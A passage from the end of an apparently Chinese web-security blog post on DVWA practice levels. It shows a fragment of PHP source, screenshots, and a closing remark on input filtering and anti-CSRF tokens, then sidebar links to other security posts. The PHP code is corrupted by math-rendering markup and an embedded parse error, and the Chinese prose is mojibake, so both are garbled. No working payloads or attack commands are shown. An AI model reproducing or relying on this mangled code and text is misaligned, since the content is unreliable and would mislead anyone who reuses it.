class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_Ì²__mysqli_ston&quot;]â€¦'>GLOBALS[&quot;___mysqli_ston&quot;]) : ((</span>___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );</p>
<p>//mysql_close(); }<br>
?&gt;`<br>
555<br>
<img src="https://jinqipiaopiao.github.io//post-images/1617093072729.png" alt="" loading="lazy"><br>
<a href="https://imgchr.com/i/rp3Vl6"><img src="https://s3.ax1x.com/2020/12/08/rp3Vl6.png" alt="rp3Vl6.png" loading="lazy"></a><br>
medium<br>
<img src="https://jinqipiaopiao.github.io//post-images/1617093762773.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1617093785920.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1617101147858.png" alt="" loading="lazy"></p>
<pre><code>    å›¾ä¸€ï¼š
</code></pre>
<p><a href="https://imgchr.com/i/rp88UJ"><img src="https://s3.ax1x.com/2020/12/08/rp88UJ.png" alt="rp88UJ.png" loading="lazy"></a><br>
å›¾äºŒï¼š<br>
<a href="https://imgchr.com/i/rp8wDO"><img src="https://s3.ax1x.com/2020/12/08/rp8wDO.png" alt="rp8wDO.png" loading="lazy"></a></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1617093859560.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1617093889979.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1617093926166.png" alt="" loading="lazy"></p>
<p>å¯¹nameä¹Ÿè¿›è¡Œäº†æ›´åŠ ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ— æ³•è¿›è¡Œnameå‚æ•°æ³¨å…¥ï¼Œè¿˜å¢åŠ äº†Anti-CSRF tokené˜²æ­¢CSRFæ”»å‡»ï¼Œå®Œå…¨æœç»äº†XSSæ¼æ´å’ŒCSRFæ¼æ´ã€‚</p>

            </div>
          </article>
        </div>
        <div class="paper" data-aos="fade-in">
          
            <div class="next-post">
              <div class="next">
                ä¸‹ä¸€ç¯‡
              </div>
              <a href="https://jinqipiaopiao.github.io/post/dvwa-sql-injectionblindsql-mang-zhu/">
                <h3 class="post-title">
                  DVWAä¹‹SQL Injection(Blind)(SQLç›²æ³¨)
                </h3>
              </a>
            </div>
          
        </div>
        
      </div>

      <div class="sm-12 md-4 col sidebar">
  <div class="paper info-container">
    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1627392112619" class="no-responsive avatar">
    <div class="text-muted">æ¸©æ•…è€ŒçŸ¥æ–°</div>
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      æœ€æ–°æ–‡ç« 
    </div>
    <div class="row">
      <ul>
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">æš‘å‡å­¦ä¹ ç¬”è®°è®°å½•</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQLæ³¨å…¥è¿‡æ»¤å­—ç¬¦çš„Fuzzè„šæœ¬æµ‹è¯•</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5ç›¸å…³æ¯”è¾ƒ</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">åˆ©ç”¨é¢„ç¼–è¯‘æ¥SQLæ³¨å…¥</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-æ¨¡æ¿æ³¨å…¥</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">webå®‰å…¨ç›¸å…³çŸ¥è¯†ç‚¹</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">åº”ç”¨å±‚åè®®</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/">å±€åŸŸç½‘äº¤æ¢æœºå®‰å…¨</a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      æ ‡ç­¾åˆ—è¡¨
    </div>
    <div class="row">
      
        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge ">
          Gridea
        </a>
      
    </div>
  </div>
  <div class="paper">
    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
  </div>
</div>


    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

</script>




  </body>
</html>
